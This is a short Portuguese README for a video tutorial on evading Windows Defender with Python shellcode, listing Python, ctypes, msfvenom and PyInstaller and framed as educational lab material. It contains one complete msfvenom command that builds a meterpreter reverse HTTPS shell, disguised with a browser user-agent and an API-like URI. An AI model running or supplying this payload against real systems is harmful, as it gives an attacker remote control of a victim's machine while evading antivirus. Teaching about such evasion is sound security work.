#  Bypass do Windows Defender com Shellcode em Python  

Este repositório acompanha o vídeo tutorial publicado no meu canal, com o objetivo **exclusivamente educacional** e de **conscientização em segurança cibernética**.  

Mostro como técnicas ofensivas podem ser usadas para evadir defesas e, principalmente, como profissionais de segurança podem **entender, detectar e mitigar** esses ataques.  

⚠️ **Aviso importante**  
Este conteúdo tem caráter acadêmico e deve ser usado apenas em **laboratórios controlados**, para aprendizado em segurança ofensiva e defesa cibernética.  
Não utilize em ambientes de produção.  

---

##  Ferramentas apresentadas  

- Python  
- ctypes  
- msfvenom (Metasploit)  
- PyInstaller  

---

##  Comando do Payload
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.245 LPORT=666 LURI=/api/v1/data/ HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76" -f python
```
---

##  Assista ao vídeo  

https://youtu.be/2U7F4oFewaA

---

##  Objetivo  

O foco deste conteúdo é ajudar profissionais e estudantes de cibersegurança a compreender:  

- O funcionamento de técnicas de evasão  
- As limitações de antivírus tradicionais  
- Como reforçar camadas de defesa  
